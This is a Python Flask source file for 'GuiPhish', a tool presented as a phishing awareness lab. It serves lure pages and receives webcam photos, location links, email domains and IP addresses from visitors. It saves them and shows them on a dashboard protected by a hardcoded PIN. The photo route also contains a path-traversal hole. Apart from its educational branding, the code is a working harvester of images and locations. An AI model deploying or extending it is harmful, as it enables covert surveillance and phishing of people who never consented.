import os
import json
import shutil
import random
from datetime import datetime
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS

DASHBOARD_PIN = "guiphish"

BANNERS = [
r"""
  ██████╗ ██╗   ██╗██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
 ██╔════╝ ██║   ██║██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
 ██║  ███╗██║   ██║██║██████╔╝███████║██║███████╗███████║
 ██║   ██║██║   ██║██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
 ╚██████╔╝╚██████╔╝██║██║     ██║  ██║██║███████║██║  ██║
  ╚═════╝  ╚═════╝ ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝

        🔐 GuiPhish Awareness Lab
""",

r"""
   ▄████  █    ██  ██▓ ██▓███
        📊 Awareness • Logs • Reports
""",

r"""
        👁️ Browser Permission Lab
        📡 Camera • Location • Email
""",

r"""
        🔐 GuiPhish Toolkit
        🧠 Security Education
""",

r"""
        🎣 Social Engineering Lab
        🌍 Simulation
""",

r"""
        📸 Camera | 🌍 Location | 📧 Email
"""
]

app = Flask(__name__)
CORS(app)

PASTAS = ["logs", "fotos", "relatorios"]
for pasta in PASTAS:
    os.makedirs(pasta, exist_ok=True)

# ================= LOGS =================

def ler_eventos():
    caminho = "logs/eventos.jsonl"
    if not os.path.exists(caminho):
        return []

    eventos = []
    with open(caminho, "r", encoding="utf-8") as f:
        for linha in f:
            try:
                eventos.append(json.loads(linha))
            except:
                pass
    return eventos

def mostrar_logs():
    eventos = ler_eventos()

    print("\n📊 Últimos eventos:\n")

    for e in eventos[-10:]:
        print(f"{e['tipo']} | {e['status']} | {e['ip']}")

# ================= RELATÓRIO =================

def gerar_relatorio():
    eventos = ler_eventos()

    nome = f"relatorios/relatorio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    with open(nome, "w", encoding="utf-8") as f:
        f.write("Relatório GuiPhish\n\n")
        for e in eventos:
            f.write(json.dumps(e, ensure_ascii=False) + "\n")

    print(f"[+] Relatório salvo: {nome}")

# ================= LIMPEZA =================

def limpar():
    confirm = input("Digite SIM para apagar tudo: ")

    if confirm != "SIM":
        return

    for pasta in PASTAS:
        shutil.rmtree(pasta)
        os.makedirs(pasta)

    print("[+] Limpo")

# ================= MENU =================

def menu():
    print("\nGuiPhish\n")
    print("1) Camera")
    print("2) Localização")
    print("3) Logs")
    print("4) Relatório")
    print("5) Limpar")
    print("6) Email")
    print("7) Sair")

    return input("Opção: ")

# ================= ROTAS =================

@app.route("/")
def index():
    return send_file("index.html")

@app.route("/email")
def email_page():
    return send_file("email.html")

@app.route("/foto/<nome>")
def foto(nome):
    return send_file(f"fotos/{nome}")

# ================= DASHBOARD =================

@app.route("/dashboard")
def dashboard():
    pin = request.args.get("pin")

    if pin != DASHBOARD_PIN:
        return "Acesso negado", 403

    eventos = ler_eventos()

    fotos = []
    if os.path.exists("fotos"):
        fotos = [f for f in os.listdir("fotos") if f.endswith(".jpg")]

    html = """
    <html>
    <body style="background:#0f172a;color:white;font-family:Arial">

    <h1>📊 GuiPhish Dashboard</h1>

    <h2>Fotos</h2>
    """

    for f in fotos:
        html += f'<img src="/foto/{f}" width="200">'

    html += "<h2>Eventos</h2>"

    for e in eventos[-20:]:
        html += f"<p>{e.get('tipo')} | {e.get('status')} | {e.get('ip')}</p>"

        if e.get("google_maps") != "N/A":
            html += f"<a href='{e.get('google_maps')}' target='_blank'>Maps</a><br>"

        if e.get("email_domain") != "N/A":
            html += f"<p>Email: {e.get('email_domain')}</p>"

    html += "</body></html>"

    return html

# ================= EVENTO =================

@app.route("/evento", methods=["POST"])
def evento():
    data = request.json or {}

    evento = {
        "timestamp": str(datetime.now()),
        "ip": request.remote_addr,
        "tipo": data.get("tipo"),
        "status": data.get("status"),
        "google_maps": data.get("google_maps", "N/A"),
        "email_domain": data.get("email_domain", "N/A")
    }

    with open("logs/eventos.jsonl", "a", encoding="utf-8") as f:
        f.write(json.dumps(evento) + "\n")

    print("[+] EVENTO:", evento)

    return jsonify({"ok": True})

# ================= CAPTURE =================

@app.route("/capture", methods=["POST"])
def capture():
    data = request.json

    img = data.get("image").split(",")[1]

    import base64
    img_bytes = base64.b64decode(img)

    nome = f"fotos/{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"

    with open(nome, "wb") as f:
        f.write(img_bytes)

    print("[+] FOTO SALVA:", nome)

    return jsonify({"ok": True})

# ================= MAIN =================

if __name__ == "__main__":
    print(random.choice(BANNERS))

    while True:
        op = menu()

        if op == "1":
            app.config["MODO"] = "camera"
            break

        elif op == "2":
            app.config["MODO"] = "localizacao"
            break

        elif op == "3":
            mostrar_logs()

        elif op == "4":
            gerar_relatorio()

        elif op == "5":
            limpar()

        elif op == "6":
            app.config["MODO"] = "email"
            print("\nAcesse: /email\n")
            break

        elif op == "7":
            exit()

    app.run(host="0.0.0.0", port=10000)
